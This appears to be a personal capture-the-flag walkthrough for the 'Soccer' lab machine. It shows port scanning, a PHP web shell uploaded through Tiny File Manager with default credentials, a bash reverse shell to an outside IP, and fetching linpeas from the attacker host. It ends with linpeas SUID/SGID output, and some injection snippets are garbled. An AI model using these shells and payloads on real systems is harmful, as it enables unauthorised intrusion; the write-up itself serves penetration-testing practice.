###
Soccer
###
1-Enummeration:
    └─$ nmap -sV -sC -Pn 10.129.133.2 -v
        PORT     STATE SERVICE         VERSION
        22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
        |   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
        |_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
        80/tcp   open  http            nginx 1.18.0 (Ubuntu)
        | http-methods: 
        |_  Supported Methods: GET HEAD POST OPTIONS
        |_http-title: Did not follow redirect to http://soccer.htb/
        |_http-server-header: nginx/1.18.0 (Ubuntu)
        9091/tcp open  xmltec-xmlmail?
        | fingerprint-strings: 
        |   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
        |     HTTP/1.1 400 Bad Request
        |     Connection: close
        |   GetRequest: 
        |     HTTP/1.1 404 Not Found


    nikto -h http://soccer.htb/
         /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.

    
    $ gobuster dir -u http://soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
        /tiny

    Port 80:
        nginx/1.18.0 (Ubuntu)

        http://soccer.htb/tiny/
            Login Page


        Via BurpSuite we can see that we can amnipulate variable in url:
            GET /tiny/tinyfilemanager.php?img=


            GET /tiny/tinyfilemanager.php?img=<echo "Hello, " . $_GET['name'];` HTTP/1.1
                Response 200: IHDR

            RFI: <include($_GET['file'] . ".php");` 
            LFI: file=../../etc/passwd` 
            
            CMD: <?php
                 system($_REQUEST['cmd']);
                 ?>

            Session Hijcaking: <include($_GET['file'] . ".php");`
    
    tinyfilemanager is configured with the default credentials:
        admin - admiin@123


    Get a remote shell:
        on Burp Repeater we try to execute remote cmds via cmd2.php that contains <?php system($_REQUEST['cmd']); ?>:
            POST /tiny/uploads/cmd2.php HTTP/1.1

            cmd=whoami


        Repeater remote shell:
            POST /tiny/uploads/cmd2.php HTTP/1.1

            cmd=bash -c 'bash -i >& /dev/tcp/10.10.15.69/9001 0>&1'

            Encode URL Format:
                cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.15.69/9001+0>%261'


    Simple remote shell Technique:
        We have the possibility to create a Folder i named it "script"

            From this Folder i have uploaded "reverse-shell.php" then trigger via URL:
                http://soccer.htb/tiny/uploads/script/php-reverse-shell.php

    Remote Shell:
        /bin/sh: 0: can't access tty; job control turned off
            $ whoami
            www-data

        TTY Shell:
            python3 -c 'import pty; pty.spawn("/bin/bash")'

            $ python3 -c 'import pty; pty.spawn("/bin/bash")'
                www-data@soccer:/home/player$ cat user.txt

        in order to gain time Linpeas Enum:

            Kali Machine:
                python3-  -m http.server 443

            Target machine:
                www-data@soccer:~/html/tiny/uploads/script$ wget http://10.10.14.91:443/linpeas.sh

                linpeas.sh          100%[===================>] 949.15K  --.-KB/s    in 0.09s   

                www-data@soccer:~/html/tiny/uploads/script$ chmod +x linpeas.sh
                chmod +x linpeas.sh


                ══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                                      ╚════════════════════════════════════╝
                        ╔══════════╣ SUID - Check easy privesc, exploits and write perms
                        ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
                        -rwsr-xr-x 1 root root 42K Nov 17  2022 /usr/local/bin/doas
                        -rwsr-xr-x 1 root root 140K Nov 28  2022 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
                        -rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
                        -rwsr-xr-x 1 root root 463K Mar 30  2022 /usr/lib/openssh/ssh-keysign
                        -rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
                        -rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
                        -rwsr-xr-x 1 root root 39K Feb  7  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
                        -rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
                        -rwsr-xr-x 1 root root 55K Feb  7  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
                        -rwsr-xr-x 1 root root 67K Feb  7  2022 /usr/bin/su
                        -rwsr-xr-x 1 root root 44K Nov 29  2022 /usr/bin/newgrp  --->  HP-UX_10.20
                        -rwsr-xr-x 1 root root 84K Nov 29  2022 /usr/bin/chfn  --->  SuSE_9.3/10
                        -rwsr-xr-x 1 root root 163K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
                        -rwsr-xr-x 1 root root 67K Nov 29  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
                        -rwsr-xr-x 1 root root 87K Nov 29  2022 /usr/bin/gpasswd
                        -rwsr-xr-x 1 root root 52K Nov 29  2022 /usr/bin/chsh
                        -rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
                        -rwsr-xr-x 1 root root 121K Nov 25  2022 /snap/snapd/17883/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
                        -rwsr-xr-x 1 root root 84K Mar 14  2022 /snap/core20/1695/usr/bin/chfn  --->  SuSE_9.3/10
                        -rwsr-xr-x 1 root root 52K Mar 14  2022 /snap/core20/1695/usr/bin/chsh
                        -rwsr-xr-x 1 root root 87K Mar 14  2022 /snap/core20/1695/usr/bin/gpasswd
                        -rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1695/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
                        -rwsr-xr-x 1 root root 44K Mar 14  2022 /snap/core20/1695/usr/bin/newgrp  --->  HP-UX_10.20
                        -rwsr-xr-x 1 root root 67K Mar 14  2022 /snap/core20/1695/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
                        -rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1695/usr/bin/su
                        -rwsr-xr-x 1 root root 163K Jan 19  2021 /snap/core20/1695/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
                        -rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1695/usr/bin/umount  --->  BSD/Linux(08-1996)
                        -rwsr-xr-- 1 root systemd-resolve 51K Oct 25  2022 /snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
                        -rwsr-xr-x 1 root root 463K Mar 30  2022 /snap/core20/1695/usr/lib/openssh/ssh-keysign
                        
                        ╔══════════╣ SGID
                        ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
                        -rwxr-sr-x 1 root utmp 15K Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
                        -rwxr-sr-x 1 root shadow 31K Nov 29  2022 /usr/bin/expiry
                        -rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
                        -rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write
                        -rwxr-sr-x 1 root ssh 343K Mar 30  2022 /usr/bin/ssh-agent
                        -rwxr-sr-x 1 root shadow 83K Nov 29  2022 /usr/bin/chage
                        -rwxr-sr-x 1 root tty 35K Feb  7  2022 /usr/bin/wall
                        -rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
                        -rwxr-sr-x 1 root shadow 43K Sep 17  2021 /usr/sbin/pam_extrausers_chkpwd
                        -rwxr-sr-x 1 root shadow 43K Sep 17  2021 /usr/sbin/unix_chkpwd
                        -rwxr-sr-x 1 root shadow 83K Mar 14  2022 /snap/core20/1695/usr/bin/chage
                        -rwxr-sr-x 1 root shadow 31K Mar 14  2022 /snap/core20/1695/usr/bin/expiry
                        -rwxr-sr-x 1 root crontab 343K Mar 30  2022 /snap/core20/1695/usr/bin/ssh-agent
                        -rwxr-sr-x 1 root tty 35K Feb  7  2022 /snap/core20/1695/usr/bin/wall
                        -rwxr-sr-x 1 root shadow 43K Sep 17  2021 /snap/core20/1695/usr/sbin/pam_extrausers_chkpwd
                        -rwxr-sr-x 1 root shadow 43K Sep 17  2021 /snap/core20/1695/usr/sbin/unix_chkpwd



            

































            

